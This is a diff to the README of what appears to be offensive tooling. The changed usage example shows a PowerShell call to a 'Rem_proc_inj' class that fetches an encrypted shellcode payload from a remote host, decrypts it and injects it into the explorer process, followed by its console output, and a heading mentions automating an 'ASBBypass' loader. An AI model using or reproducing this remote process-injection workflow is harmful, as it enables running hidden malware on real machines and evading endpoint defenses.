@@ -96,9 +96,9 @@ Decrypt, inject and run the generated payload, loading from a local filesystem o
 Usage: ex_prog(string password, bool Encrypt, bool Decrypt, string url = "", string localBinPath = "", string outFile = "", string rP = "")
 
 ```
-PS > [Rem_proc_inj.execute_program]::ex_prog("SUPERSECRETPASSWORD",$false,$true,"","x:\payloads\msftest.bin_enc","","explorer")
+PS > [Rem_proc_inj.execute_program]::ex_prog("SUPERSECRETPASSWORD",$false,$true,"http://192.168.252.5/msftest.bin_enc","","","explorer")
 [*] Injecting & Executing SC of size 510 into process explorer
-[*] Memory for injecting shellcode allocated at 0x44236800.
+[*] Memory for injecting shellcode allocated at 0x20250624.
 ```
 
 # Automating loading ASBBypass and Rem_proc_inj using Powershell scripts
